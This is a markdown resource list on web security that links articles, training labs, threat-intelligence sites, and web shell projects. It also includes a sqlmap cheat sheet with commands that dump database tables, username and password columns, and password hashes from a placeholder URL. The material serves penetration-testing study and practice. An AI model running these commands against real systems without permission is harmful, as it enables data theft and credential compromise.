# Web

## Resources

### Articles

* [Brainfuck beware: JavaScript is after you!](https://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html) - Patricio Palladino
* [CSRF, CORS, and HTTP Security headers Demystified](https://blog.vnaik.com/posts/web-attacks.html) - Varun Naik
* [Hacking JWT Tokens: The None Algorithm](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771) - Shivam Bathla

### GitHub Repositories

* [A practical security guide for web developers](https://github.com/FallibleInc/security-guide-for-developers)
* [Awesome Web Hacking](https://github.com/infoslack/awesome-web-hacking)
* [Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
* [JavaScript Security Cookbook](https://github.com/rajamsrgit/JavaScriptSecurityCookbook)
* [OWASP Web Application Security Testing Checklist](https://github.com/0xRadi/OWASP-Web-Checklist)
* [phpbash](https://github.com/Arrexel/phpbash) - A semi-interactive PHP shell compressed into a single file

### Cheat Sheets

#### sqlmap

```
Target:
  At least one of these options has to be provided to define the
  target(s)

  -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")

Request:
  These options can be used to specify how to connect to the target URL
  
  -A AGENT            HTTP User-Agent header value
  -H HEADER           Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
  -X METHOD           Force usage of given HTTP method (e.g. PUT)
  --data=DATA         Data string to be sent through POST (e.g. "id=1")
  --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
  
Enumeration:
  These options can be used to enumerate the back-end database
  management system information, structure and data contained in the
  tables
  
  -a, --all           Retrieve everything
  --current-user      Retrieve DBMS current user
  --current-db        Retrieve DBMS current database
  --hostname          Retrieve DBMS server hostname
  --is-dba            Detect if the DBMS current user is DBA
  --users             Enumerate DBMS users
  --passwords         Enumerate DBMS users password hashes
  --privileges        Enumerate DBMS users privileges
  --roles             Enumerate DBMS users roles
  --dbs               Enumerate DBMS databases
  --tables            Enumerate DBMS database tables
  --columns           Enumerate DBMS database table columns
  --schema            Enumerate DBMS schema
  --count             Retrieve number of entries for table(s)
  --dump              Dump DBMS database table entries
  --dump-all          Dump entries of all DBMS database tables
  --search            Search column(s), table(s) and/or database name(s)
  -D DB               DBMS database to enumerate
  -T TBL              DBMS database table(s) to enumerate
  -C COL              DBMS database table column(s) to enumerate
  --exclude=EXCLUDE   DBMS database identifier(s) to not enumerate
  -U USER             DBMS user to enumerate
  --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
  --sql-query=SQLQ..  SQL statement to be executed
  --sql-shell         Prompt for an interactive SQL shell
    
Brute force:
  These options can be used to run brute force checks
  
  --common-tables     Check existence of common tables
  --common-columns    Check existence of common columns
  --common-files      Check existence of common files
```

```shellscript
# Basic automated scan from a URL
sqlmap -u "http://example.com/vuln.php?id=1" --dbs --batch

# List tables of a specific database
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --tables --batch

# List columns of a specific table
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --columns --batch

# Dump the contents of a specific table
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --dump --batch

# Dump only specific columns
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name -C username,password --dump --batch

# Dump with a WHERE condition
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --where="id < 10" --dump --batch

# Dump everything in a specific database
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --dump-all --batch

# Dump in-memory password hashes
sqlmap -u "http://example.com/vuln.php?id=1" --passwords --batch
```

### Tools

#### JSON Web Tokens

* [JWT Debugger](https://token.dev/)
* [jwt.io](https://jwt.io/)

#### Online Malware Detection

* [MetaDefender Cloud](https://metadefender.opswat.com/)
* [VirusTotal](https://www.virustotal.com)

#### Web Shells

* [b374k shell](https://github.com/b374k/b374k)
* [p0wny-shell](https://github.com/flozz/p0wny-shell)

### Websites

* [abuse.ch](https://abuse.ch/) - Fighting malware and botnets
  * [Feodo Tracker](https://feodotracker.abuse.ch/) - sharing C\&C servers
  * [MalwareBazaar](https://bazaar.abuse.ch/) - Malware sample exchange
  * [SSL Blacklist](https://sslbl.abuse.ch/) - Detecting malicious SSL connections
  * [ThreatFox ](https://threatfox.abuse.ch/)- Share Indicators of Compromise
  * [URLhaus ](https://urlhaus.abuse.ch/)- Malware URL exchange
  * [YARAify ](https://yaraify.abuse.ch/)- YARA scan engine
* [bWAPP ](http://www.itsecgames.com/index.htm)- a buggy web application
* [Censys Search](https://search.censys.io/) - search engine for Internet hosts
* [Cisco Talos Intelligence](https://talosintelligence.com/) - comprehensive threat intelligence
* [flAWS](http://flaws.cloud/)
* [Hacking-Lab](https://www.hacking-lab.com/)
* [How HTTPS works](https://howhttps.works/)
* [JSFuck](http://www.jsfuck.com/) - Write any JavaScript with 6 Characters: \[]\()!+
* [Open Web Application Security Project (OWASP)](https://owasp.org/)
  * [Cheat Sheets](https://cheatsheetseries.owasp.org/)
  * [Juice Shop](https://owasp.org/www-project-juice-shop/)
  * [Vulnerable Web Applications Directory](https://owasp.org/www-project-vulnerable-web-applications-directory/)
  * [WebGoat](https://owasp.org/www-project-webgoat/)
* [PentesterLab](https://pentesterlab.com/)
* [PhishTool](https://www.phishtool.com/)
* [Shodan](https://www.shodan.io/) - The search engine for Internet of Things
* [The Illustrated TLS Connection](https://tls.ulfheim.net/)
* [urlscan.io](https://urlscan.io/) - URL and website scanner
* [Web Application Exploits and Defenses](https://google-gruyere.appspot.com/)
* [Web Security Academy](https://portswigger.net/web-security) - PortSwigger
* [Webhacking.kr](https://webhacking.kr/)
* [Websec](http://websec.fr/)
* [XSS Game](https://xss-game.appspot.com/)
